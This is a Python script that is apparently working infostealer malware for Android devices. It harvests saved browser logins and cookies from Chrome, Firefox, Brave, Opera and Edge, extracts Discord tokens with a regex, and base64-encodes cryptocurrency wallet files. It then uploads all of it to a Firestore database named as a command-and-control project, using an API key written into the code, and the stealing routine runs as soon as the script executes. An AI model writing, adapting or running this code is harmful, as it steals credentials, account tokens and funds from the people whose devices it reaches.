import os, glob, json, time, base64, sqlite3, tempfile, shutil, re, hashlib, urllib.request

PROJECT_ID = "jack-c2-b55bb"
API_KEY = "AIzaSyBuw3qWiY8VXffwyJH422ocsNZuiDTyKXI"
DID = hashlib.md5((os.uname().nodename + str(__import__("uuid").getnode())).encode()).hexdigest()[:16]


def _url(path):
    return "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/" + path + "?key=" + API_KEY


def _patch(path, data):
    try:
        fields = {}
        for k, v in data.items():
            if isinstance(v, int) and not isinstance(v, bool):
                fields[k] = {"integerValue": str(v)}
            else:
                fields[k] = {"stringValue": str(v)}
        body = json.dumps({"fields": fields}).encode()
        req = urllib.request.Request(_url(path), data=body, method="PATCH", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=30) as r:
            r.read()
        return True
    except Exception:
        return False


def _read_sqlite(path):
    rows_out = []
    try:
        tmp = os.path.join(tempfile.gettempdir(), "s_" + hashlib.md5(path.encode()).hexdigest() + ".db")
        shutil.copy2(path, tmp)
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        for tbl in ["logins", "cookies", "moz_logins", "moz_cookies"]:
            try:
                cur.execute("SELECT * FROM " + tbl + " LIMIT 500")
                cols = [d[0] for d in cur.description]
                for r in cur.fetchall():
                    rows_out.append({c: str(r[i])[:2000] for i, c in enumerate(cols)})
            except Exception:
                continue
        con.close()
        try:
            os.remove(tmp)
        except Exception:
            pass
    except Exception:
        pass
    return rows_out


def _browsers():
    out = {}
    bases = [
        ("/sdcard/Android/data/com.android.chrome/files", "chrome"),
        ("/sdcard/Android/data/org.mozilla.firefox/files", "firefox"),
        ("/sdcard/Android/data/com.brave.browser/files", "brave"),
        ("/sdcard/Android/data/com.opera.browser/files", "opera"),
        ("/sdcard/Android/data/com.microsoft.emmx/files", "edge")
    ]
    for base, tag in bases:
        hits = []
        try:
            for pat in [base + "/**/Login Data", base + "/**/cookies.sqlite", base + "/**/logins.json"]:
                for p in glob.glob(pat, recursive=True):
                    if p.endswith(".sqlite") or p.endswith("Login Data"):
                        hits.extend(_read_sqlite(p))
                    else:
                        try:
                            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                                hits.append({"raw": f.read()[:50000], "src": p})
                        except Exception:
                            continue
        except Exception:
            pass
        if hits:
            out[tag] = hits
    return out


def _discord():
    tokens = set()
    patterns = [
        "/sdcard/Android/data/com.discord/files/**/*.ldb",
        "/sdcard/Android/data/com.discord/files/**/*.log"
    ]
    for pat in patterns:
        try:
            for p in glob.glob(pat, recursive=True):
                try:
                    with open(p, "r", encoding="utf-8", errors="ignore") as f:
                        for m in re.findall(r"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}", f.read()):
                            tokens.add(m)
                except Exception:
                    continue
        except Exception:
            continue
    return list(tokens)


def _wallets():
    out = []
    patterns = [
        "/sdcard/**/*.wallet",
        "/sdcard/**/wallet.dat",
        "/sdcard/**/keystore/**/*.json",
        "/sdcard/**/Electrum/**/*"
    ]
    for pat in patterns:
        try:
            for p in glob.glob(pat, recursive=True)[:50]:
                try:
                    with open(p, "rb") as f:
                        out.append({"path": p, "data": base64.b64encode(f.read(4096)).decode()})
                except Exception:
                    continue
        except Exception:
            continue
    return out


def _run():
    try:
        payload = {
            "browsers": _browsers(),
            "discord_tokens": _discord(),
            "wallets": _wallets()
        }
        s = json.dumps(payload)[:900000]
        _patch("devices/" + DID + "/stealer/latest", {"json": s, "ts": int(time.time())})
    except Exception:
        pass


_run()